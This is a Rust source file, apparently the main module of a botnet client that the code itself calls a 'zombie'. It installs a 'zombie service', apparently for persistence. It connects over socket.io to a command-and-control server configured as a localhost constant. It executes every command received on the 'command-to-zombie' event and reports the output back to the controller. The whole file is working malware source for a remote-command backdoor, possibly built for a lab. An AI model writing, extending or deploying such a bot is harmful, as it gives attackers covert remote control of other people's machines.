mod constants;
mod utils;
mod zombies;

use constants::localhost::{LOCALHOST_ADDRESS_C2, LOCALHOST_PORT};
use futures_util::FutureExt;
use rust_socketio::{
    asynchronous::{Client, ClientBuilder},
    Error, Payload,
};
use std::time::Duration;
use utils::types::command_payload::parse_command_data;
use zombies::{create_zombie_service::create_zombie_service, run_command::run_command};

#[tokio::main]
async fn main() {
    match create_zombie_service() {
        Ok(_) => println!("Zombie service created"),
        Err(e) => println!("Error creating zombie service:\n{}", e),
    }

    let url: String = format!("http://{}:{}", LOCALHOST_ADDRESS_C2, LOCALHOST_PORT);

    ClientBuilder::new(url)
        .namespace("/")
        .on("auth", |payload: Payload, _: Client| {
            async move {
                println!("Auth event received: {:?}", payload);
            }
            .boxed()
        })
        .on("command-to-zombie", |payload, socket: Client| {
            async move {
                if let Ok(command_data) = parse_command_data(payload) {
                    match run_command(&command_data.command) {
                        Ok(output) => {
                            emit_from_zombie_to_c2(&socket, output).await.unwrap();
                        }

                        Err(e) => {
                            emit_from_zombie_to_c2(&socket, format!("{}", e))
                                .await
                                .unwrap();
                        }
                    }
                } else {
                    emit_from_zombie_to_c2(&socket, format!("Error parsing command data"))
                        .await
                        .unwrap();
                }
            }
            .boxed()
        })
        .connect()
        .await
        .expect("Connection failed");

    println!("Connected to server");

    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
}

async fn emit_from_zombie_to_c2<T>(socket: &Client, payload: T) -> Result<(), Error>
where
    T: Into<Payload>,
{
    match socket.emit("command-response-from-zombie", payload).await {
        Ok(_) => Ok(()),
        Err(e) => Err(e),
    }
}
